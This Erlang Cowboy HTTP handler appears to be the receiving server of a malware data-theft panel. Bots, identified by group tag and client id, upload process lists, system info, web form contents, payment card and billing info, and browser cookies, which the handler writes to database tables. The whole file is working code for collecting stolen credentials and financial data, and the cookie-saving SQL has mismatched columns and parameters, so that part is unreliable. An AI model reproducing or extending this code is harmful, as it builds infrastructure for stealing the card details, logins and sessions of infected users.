-module(http_handler).

-export([
  init/3,
  handle/2,
  terminate/3
]).

-include("client.hrl").
-include("limits.hrl").

-define(IS_REQ(Req), element(1, Req) =:= http_req).

init(_Type, Req, [ Limits ]) ->
	{ok, Req, Limits}.

handle(Req, Limits) ->
	{ Path, Req0 } = cowboy_req:path(Req),
	Split0 = binary:split(Path, <<"/">>, [global]),
	lager:info("Path ~s", [ Path ]),
	Split1 = [ decode_uri(Part) || Part <- Split0 ],
	Req2 = case Split1 of
		[ <<"">>, GroupTag, ClientId, Command | Args ] ->
			{ ok, Client } = client:parse_id(#client{
				group = GroupTag,
				client_id = ClientId
			}),
			try
				lager:info("Request for ~p ~p ~p", [ Client, Command, Args ]),
				command(Command, Args, Client, Limits, Req0)
			catch
				error:Error ->
					lager:critical("Error ~p ~p", [ Error, erlang:get_stacktrace() ]),
					reply(missing_parameters, Req0);
				throw:ReqErr when ?IS_REQ(ReqErr) ->
					ReqErr;
				throw:Result ->
					lager:critical("Error: Throw ~p ~p", [ Result, erlang:get_stacktrace() ]),
					reply(missing_parameters, Req0)
			end;
		_ ->
			reply(forbidden, Req0)
	end,
	{ ok, Req2, Limits }.

terminate(_Reason, _Req, _Limits) ->
	ok.

command(Cmd, [ <<>> ], Client, Limits, Req) ->
	command(Cmd, [], Client, Limits, Req);

command(<<"60">>, [], Client, Limits, Req) ->
	save(Client, Limits, Req);

command(<<"81">>, [] , Client, Limits, Req) ->
	save80(81,Client, Limits, Req);

command(<<"82">>, [] , Client, Limits, Req) ->
	save80(82, Client, Limits, Req);

command(<<"83">>, [] , Client, Limits, Req) ->
	save83(Client, Limits, Req);

command(<<"84">>, [], Client, Limits, Req) ->
	save84(Client, Limits, Req);

command(<<"90">>, [] , Client, Limits, Req) ->
	save90(Client, Limits, Req);

command(_, _, _Client, _Limits, Req) ->
	reply(forbidden, Req).

reply({text, Text}, Req) ->
	{ ok, Req1 } = cowboy_req:reply(200, [
		{<<"Content-Type">>, <<"text/plain">> }
	], Text, Req),
	Req1;

reply({binary, Binary}, Req) ->
	{ ok, Req1 } = cowboy_req:reply(200, [
		{<<"Content-Type">>, <<"binary">> }
	], Binary, Req),
	Req1;

reply(not_found, Req) ->
	{ ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
	Req1;

reply(forbidden, Req) ->
	{ ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
	Req1;

reply(missing_data, Req) ->
	{ ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
	Req1;

reply(missing_keys, Req) ->
	{ ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
	Req1;

reply(missing_parameters, Req) ->
	{ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
	Req1;

reply(request_timeout, Req) ->
	{ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
	Req1;

reply(Bin, Req) when is_binary(Bin) ->
	reply({text, Bin}, Req).

decode_uri(<<"">>) -> <<"">>;
decode_uri(Uri) ->
	cow_qs:urldecode(Uri).

save(Client, Limits, Req) ->
  {IdHigh, IdLow} = Client#client.id_bin,
  OS = Client#client.sys,
  OS_ver = Client#client.sys_ver,
  GroupTag = Client#client.group,
	{ KeyValues, Req2} = case multipart(Req, [
		{length, Limits#limits.max_size },
		{read_length, 64000},
		{read_timeout, 50000}
	]) of
		{ ok, KV, Req00 } -> { KV, Req00 };
		{ undefined, Req00 } ->
			throw(reply(forbidden, Req00))
	end,

	lager:info("Keys ~p", [ KeyValues ]),

	DataLimit = Limits#limits.data_size,
	Data = case proplists:get_value(<<"data">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'data' "),
			throw(reply(missing_data, Req2));
		Binary0 when size(Binary0) =< DataLimit ->
			Binary0;
		<<Binary0:DataLimit/binary, _/binary>> -> Binary0
	end,

	KeysLimit = Limits#limits.keys_size,
	Keys = case proplists:get_value(<<"keys">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'keys' "),
			throw(reply(missing_keys, Req2));
		Binary1 when size(Binary1) =< KeysLimit ->
			Binary1;
		<<Binary1:KeysLimit/binary, _/binary>> -> Binary1
	end,

	ImageLimit = Limits#limits.image_size,
	Image = case proplists:get_value(<<"image">>, KeyValues, undefined) of
		undefined -> null;
		Binary2 when size(Binary2) =< ImageLimit ->
			Binary2;
		_ -> null
	end,

	LinkLimit = Limits#limits.link_size,
	Link = case proplists:get_value(<<"link">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'link' "),
			throw(reply(forbidden, Req2));
		Binary3 when size(Binary3) =< LinkLimit ->
			Binary3;
		<<Binary3:LinkLimit/binary, _/binary>> -> Binary3
	end,

  SQL = "INSERT INTO data (created_at, id_low, id_high, os, os_ver, \"group\", data, keys, image, link, cid_prefix ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10 )",
	{ok, _ } = db:equery(SQL, [ IdLow, IdHigh, OS, OS_ver, GroupTag, Data, Keys, Image, Link, Client#client.cid_prefix ]),
	reply(<<"/1/">>, Req2).

save80(Type, Client, Limits, Req) ->
  {IdHigh, IdLow} = Client#client.id_bin,
  OS = Client#client.sys,
  OS_ver = Client#client.sys_ver,
  GroupTag = Client#client.group,
	{ KeyValues, Req2} = case multipart(Req, [
		{length, Limits#limits.max_size },
		{read_length, 64000}, %% 64кб
		{read_timeout, 50000}
	]) of
		{ ok, KV, Req00 } -> { KV, Req00 };
		{ undefined, Req00 } ->
			throw(reply(forbidden, Req00))
	end,

	lager:info("Keys ~p", [ KeyValues ]),

	DataLimit = Limits#limits.data8,
	Data = case proplists:get_value(<<"data">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'data' "),
			throw(reply(missing_data, Req2));
		Binary0 when size(Binary0) =< DataLimit ->
			Binary0;
		<<Binary0:DataLimit/binary, _/binary>> -> Binary0
	end,

	SourceLimit = Limits#limits.source8,
	Source = case proplists:get_value(<<"source">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'source' "),
			throw(reply(missing_keys, Req2));
		Binary1 when size(Binary1) =< SourceLimit ->
			Binary1;
		<<Binary1:SourceLimit/binary, _/binary>> -> Binary1
	end,

  SQL = "INSERT INTO data80 (created_at, id_low, id_high, os, os_ver, \"group\", data, source, type ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8 )",
	{ok, _ } = db:equery(SQL, [ IdLow, IdHigh, OS, OS_ver, GroupTag, Data, Source, Type ]),
	reply(<<"/1/">>, Req2).

save90(Client, Limits, Req) ->
  {IdHigh, IdLow} = Client#client.id_bin,
  Group = Client#client.group,
	{ KeyValues, Req2} = case multipart(Req, [
		{length, Limits#limits.max_size },
		{read_length, 64000},
		{read_timeout, 50000}
	]) of
		{ ok, KV, Req00 } -> { KV, Req00 };
		{ undefined, Req00 } ->
			throw(reply(forbidden, Req00))
	end,

	ProcListLimit = 64 * 1024,
	ProcList = case proplists:get_value(<<"proclist">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'proclist' "),
			throw(reply(missing_data, Req2));
		Binary0 when size(Binary0) =< ProcListLimit ->
			Binary0;
		<<Binary0:ProcListLimit/binary, _/binary>> -> Binary0
	end,

	SysInfoLimit = 64 * 1024,
	SysInfo = case proplists:get_value(<<"sysinfo">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'sysinfo' "),
			throw(reply(missing_data, Req2));
		Binary1 when size(Binary1) =< SysInfoLimit ->
			Binary1;
		<<Binary1:SysInfoLimit/binary, _/binary>> -> Binary1
	end,

  SQL = "INSERT INTO data90 (created_at, \"group\", id_low, id_high, process_info, sys_info ) VALUES ( now(), $1, $2, $3, $4, $5 )",
	{ok, _ } = db:equery(SQL, [ Group, IdLow, IdHigh, ProcList, SysInfo ]),

	reply(<<"/1/">>, Req2).

save83(Client, Limits, Req) ->
  {IdHigh, IdLow} = Client#client.id_bin,
  Group = Client#client.group,
	{ KeyValues, Req2} = case multipart(Req, [
		{length, Limits#limits.max_size },
		{read_length, 64000},
		{read_timeout, 50000}
	]) of
		{ ok, KV, Req00 } -> { KV, Req00 };
		{ undefined, Req00 } ->
			throw(reply(forbidden, Req00))
	end,

	FormData = proplists:get_value(<<"formdata">>, KeyValues, null),
	CardInfo = proplists:get_value(<<"cardinfo">>, KeyValues, null),
	BillingInfo = proplists:get_value(<<"billinginfo">>, KeyValues, null),

    SQL = "INSERT INTO data83 (created_at, \"group\", id_low, id_high, formdata, cardinfo, billinginfo ) VALUES ( now(), $1, $2, $3, $4, $5, $6 )",
	{ok, _ } = db:equery(SQL, [ Group, IdLow, IdHigh, FormData, CardInfo, BillingInfo ]),

	reply(<<"/1/">>, Req2).

save84(Client, Limits, Req) ->
	{IdHigh, IdLow} = Client#client.id_bin,
	Group = Client#client.group,
	{ KeyValues, Req2} = case multipart(Req, [
		{length, Limits#limits.max_size },
		{read_length, 64000},
		{read_timeout, 50000}
	]) of
		{ ok, KV, Req00 } -> { KV, Req00 };
		{ undefined, Req00 } ->
			throw(reply(forbidden, Req00))
	end,
	SysInfoLimit = 64 * 1024,
	case proplists:get_value(<<"data">>, KeyValues, undefined) of
		undefined ->
			lager:warning("Bad field 'data' ~p", [ KeyValues ]),
			throw(reply(missing_data, Req2));
		Binary ->
			Rows = binary:split(Binary, [ <<10>>, <<13,10>>], [ global ]),
			lists:foreach(fun(Row) ->
				case binary:split(Row, <<"|">>, [ global ]) of
					[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ] ->
						SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )",
						{ok, _ } = db:equery(SQL, [ Group, IdLow, IdHigh, base64:decode(Username), Browser, base64:decode(Domain), base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path), binary_to_integer(Secure), binary_to_integer(HttpOnly) ]);
					Any ->
						lager:warning("Bad format of CSV row: ~p", [ Any ]),
						throw(reply(missing_parameters, Req2))
				end
			end, Rows)
	end,
	reply(<<"/1/">>, Req2).

multipart(Req, Opts) ->
		case cowboy_req:parse_header(<<"content-type">>, Req) of
			{ok, {<<"multipart">>, <<"form-data">>, _}, Req2} ->
				{ Result, Req3 } = multipart_loop(Req2, Opts, []),
				{ ok, Result, Req3 };
			{ ok, undefined, Req2 } -> { undefined, Req2 };
			{ undefined, _, Req2 } -> { undefined, Req2 }
		end.

multipart_loop(Req, Opts, Acc) ->
	case (catch (cowboy_req:part(Req, Opts))) of
		{ok, Headers, Req2} ->
			case cow_multipart:form_data(Headers) of
			{data, FieldName} ->
				{Body, Req3} = stream_file(Req2),
				multipart_loop(Req3, Opts, [{FieldName, Body } | Acc]);
			{file, FieldName, _Filename, _CType, _CTransferEncoding} ->
				{ Body, Req3 } = stream_file(Req2),
				multipart_loop(Req3, Opts, [{FieldName, Body } | Acc])
			end;
		{done, Req2} ->
			{ Acc, Req2 };
		{'EXIT',{{badmatch,{ error, Reason }},_}} ->
			case Reason of
				timeout ->
					throw(reply(request_timeout, Req));
				closed -> throw(Req)
			end
	end.

stream_file(Req) ->
	case (catch cowboy_req:part_body(Req)) of
		{ok, Body, Req2} ->
			{ Body, Req2 };
		{more, Body, Req2} ->
			{ Body0, Req3 } = stream_file(Req2),
			{ <<Body/binary, Body0/binary>>, Req3};
		{'EXIT',{{badmatch,{ error, Reason }},_}} ->
			case Reason of
				timeout ->
					throw(reply(request_timeout, Req));
				closed -> throw(Req)
			end
	end.


